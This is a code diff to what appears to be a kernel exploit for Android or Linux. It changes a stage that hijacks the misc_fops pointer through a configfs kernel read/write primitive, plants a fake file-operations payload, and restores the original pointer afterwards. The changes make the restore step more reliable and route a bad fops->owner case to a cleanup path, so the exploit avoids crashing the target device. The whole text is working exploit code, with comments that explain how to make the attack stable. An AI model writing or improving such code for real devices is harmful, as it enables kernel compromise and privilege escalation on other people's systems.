@@ -559,37 +559,32 @@ static int fake_fops_owner_is_zero(int fd) {
  * to this run (seen as "pc : try_module_get+0x30/0x1f0" from misc_open).
  *
  * The old failure path wrote the original value once and ignored the result,
- * so a single failed write left the hijack in place.  This retries across both
- * address forms the stage knows about and only reports success when a read-back
- * confirms the slot holds the original value again.
+ * so a single failed write left the hijack in place.  This retries and only
+ * reports success when a read-back confirms the slot holds the original value
+ * again.
+ *
+ * Only the known-good original value is ever written.  An earlier draft of
+ * this helper also tried data_addr(ASHMEM_FOPS) as a fallback, which is
+ * unsound: read-back proves the write landed, not that the value is correct,
+ * so a wrong-but-writable candidate would be confirmed as a successful
+ * restore while leaving misc_fops pointing somewhere else.  The retry loop is
+ * for transient write failures, not for guessing alternative values.
  */
 static int restore_misc_fops_verified(int fd, uintptr_t misc_fops,
                                       uint64_t original_fops) {
-  uint64_t candidates[2];
-  size_t candidate_count = 0;
-  candidates[candidate_count++] = original_fops;
-  {
-    uint64_t alias = data_addr(ASHMEM_FOPS);
-    if (alias != original_fops) {
-      candidates[candidate_count++] = alias;
+  for (int round = 0; round < 6; round++) {
+    uint64_t readback = 0;
+    ssize_t wr = configfs_write_once(
+        fd, misc_fops, &original_fops, sizeof(original_fops));
+    if (wr != (ssize_t)sizeof(original_fops)) {
+      continue;
     }
-  }
-
-  for (int round = 0; round < 4; round++) {
-    for (size_t index = 0; index < candidate_count; index++) {
-      uint64_t readback = 0;
-      ssize_t wr = configfs_write_once(
-          fd, misc_fops, &candidates[index], sizeof(candidates[index]));
-      if (wr != (ssize_t)sizeof(candidates[index])) {
-        continue;
-      }
-      if (configfs_read_once(fd, misc_fops, &readback, sizeof(readback)) ==
-              (ssize_t)sizeof(readback) &&
-          readback == candidates[index]) {
-        fops_after = readback;
-        cfi_restore_ret = wr;
-        return 1;
-      }
+    if (configfs_read_once(fd, misc_fops, &readback, sizeof(readback)) ==
+            (ssize_t)sizeof(readback) &&
+        readback == original_fops) {
+      fops_after = readback;
+      cfi_restore_ret = wr;
+      return 1;
     }
   }
   return 0;
@@ -931,10 +926,12 @@ int try_cfi_stage(void) {
 
   int owner_ok = fake_fops_owner_is_zero(fd);
   /*
-   * owner_ok was computed but the return value below only checked `restore`,
-   * so a payload page whose fops->owner was not zero still counted as success.
+   * A non-zero fops->owner is a live panic trigger, not a warning:
    * misc_open() runs try_module_get(fops->owner) on every open of a misc
-   * device, so a non-zero owner is a live panic trigger, not a warning.
+   * device.  The original code tested owner_ok in the success condition but
+   * then returned 0 on failure without restoring, so a payload page with a
+   * non-zero owner was left reachable through misc_fops.  Route it to fail:,
+   * which restores and verifies.
    */
   if (!owner_ok) {
     cfi_last_step = 7;
